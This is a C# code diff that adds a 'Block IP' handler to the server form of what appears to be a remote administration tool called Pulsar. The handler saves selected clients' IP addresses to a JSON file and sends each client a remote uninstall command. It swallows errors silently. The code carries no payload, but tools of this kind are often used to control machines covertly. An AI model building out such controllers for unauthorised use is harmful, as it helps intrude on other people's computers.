@@ -1974,5 +1974,43 @@ namespace Pulsar.Server.Forms
         {
             MainTabControl.SelectTab(tabPage5);
         }
+
+        private void blockIPToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+
+            if (lstClients.SelectedItems.Count == 0) return;
+            if (
+                MessageBox.Show(
+                    string.Format(
+                        "Are you sure you want to Block {0} IP\\s?",
+                        lstClients.SelectedItems.Count), "Block Confirmation", MessageBoxButtons.YesNo,
+                    MessageBoxIcon.Question) == DialogResult.Yes)
+            {
+                foreach (Client c in GetSelectedClients())
+                {
+                     IPAddress clientAddress = c.EndPoint.Address;
+                string filePath = "blocked.json";
+                List<string> blockedIPs = new List<string>();
+                try
+                {
+                    if (File.Exists(filePath))
+                    {
+                        string json = File.ReadAllText(filePath);
+                        blockedIPs = System.Text.Json.JsonSerializer.Deserialize<List<string>>(json) ?? new List<string>();
+                    }
+                    if (!blockedIPs.Contains(clientAddress.ToString()))
+                    {
+                        blockedIPs.Add(clientAddress.ToString());
+                    }
+                    string updatedJson = System.Text.Json.JsonSerializer.Serialize(blockedIPs, new JsonSerializerOptions { WriteIndented = true });
+                    File.WriteAllText(filePath, updatedJson);
+                }
+                catch (Exception ex)
+                {
+                }
+                c.Send(new DoClientUninstall());
+                }
+            }
+        }
     }
 }
